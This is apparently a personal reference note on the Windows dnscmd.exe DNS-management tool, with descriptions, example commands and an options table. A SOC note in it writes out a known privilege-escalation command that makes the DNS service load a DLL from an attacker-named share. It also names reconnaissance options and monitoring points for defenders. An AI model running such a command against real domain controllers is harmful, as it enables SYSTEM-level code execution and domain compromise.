---
created: 2026-11-21
fullpath: 'C:\Windows\System32\Dnscmd.exe'
generator:
  - claude
  - microsoftlearn
tags:
aliases:
  - Dnscmd.exe
  - dnscmd
url:
  - https://learn.microsoft.com/windows-server/administration/windows-commands/dnscmd
---

**fullpath**:C:\Windows\System32\Dnscmd.exe

# description

Dnscmd is a command-line interface for managing Windows DNS servers, useful for scripting routine DNS management and unattended setup of new DNS servers. It is installed with the DNS Server role / DNS management tools and complements the DNS Manager console and the DnsServer PowerShell module.

## simple description

> ### 2026-11-21 Claude said
> dnscmd manages a Windows DNS server from the command line: list and create zones, add or delete records, clear the cache, change server settings and export zones. It can target the local or a remote DNS server. It's mostly used by admins on domain controllers running DNS.
>
> **SOC NOTE**: Known abuse: `dnscmd /config /serverlevelplugindll \\attacker\share\evil.dll` makes the DNS service (running as SYSTEM on a DC) load an arbitrary DLL after restart - privilege escalation for DnsAdmins members (MITRE ATT&CK T1574/T1543). Also used for recon (`/enumzones`, `/enumrecords`, `/zoneprint`, T1018). Monitor `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll` and DNS Server event 150/770.
>

# purpose

Manage DNS servers, zones and resource records; display and change server- and zone-level registry settings under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters`.

# typical use cases

| usage | description |
| --- | --- |
| `dnscmd dnssvr1.contoso.com /clearcache` | Clear the DNS server cache. |
| `dnscmd dnssvr1.contoso.com /zoneadd test.contoso.com /dsprimary` | Create an AD-integrated primary zone. |
| `dnscmd dnssvr1.contoso.com /recordadd test A 10.0.0.5` | Add an A record. |
| `dnscmd /recorddelete test.contoso.com test MX 10 mailserver.test.contoso.com` | Delete an MX record. |
| `dnscmd /enumrecords test.contoso.com test /additional` | List records of a node with additional data. |
| `dnscmd dnssvr1.contoso.com /startscavenging` | Start scavenging of stale records immediately. |

# options

| option    | description    |
| --- | --- |
| `<servername>` | IP address, FQDN or host name of the DNS server to manage; local server if omitted. |
| `/ageallrecords` | Sets the current time on resource record time stamps. |
| `/clearcache` | Clears the DNS cache of resource records on the server. |
| `/config` | Changes server-level or zone-level registry settings (e.g. `/addressanswerlimit`, `/bootmethod`, `/logfilepath`, `/norecursion`, `/scavenginginterval`, `/serverlevelplugindll`, zone `/aging`, `/allowupdate`, `/securesecondaries`). |
| `/enumrecords` | Lists resource records of a node in a zone (`/type`, `/authority`, `/glue`, `/additional`, `/node`, `/child`, `/startchild`, `/continue`, `/detail`). |
| `/enumzones` | Lists zones, filtered by type (`/primary`, `/secondary`, `/forwarder`, `/stub`, `/cache`, `/auto-created`, `/forward`, `/reverse`, `/ds`, `/file`) or directory partition. |
| `/exportsettings` | Writes server configuration to `%systemroot%\system32\dns\DnsSettings.txt`. |
| `/info` | Displays server settings from the DNS registry section. |
| `/ipvalidate` | Tests whether IP addresses are working DNS servers, forwarders, root hints or zone primaries (`/dnsservers`, `/forwarders`, `/roothints`, `/zonemasters`). |
| `/nodedelete` | Deletes all records for a host (`/tree`, `/f`). |
| `/recordadd` | Adds a record to a zone. |
| `/recorddelete` | Deletes a resource record (`/f` skips confirmation). |
| `/startscavenging` | Starts an immediate search for stale resource records. |
| `/statistics` | Displays or clears (`/clear`) server statistics by statistic ID. |
| `/zoneadd` | Adds a zone (`/dsprimary`, `/primary /file`, `/secondary`, `/stub`, `/dsstub`, `/forwarder`, `/dsforwarder`; `/dp`, `/domain`, `/enterprise`, `/legacy`). |
| `/zoneexport` | Writes a zone's resource records to a file in `%systemroot%\System32\Dns`. |
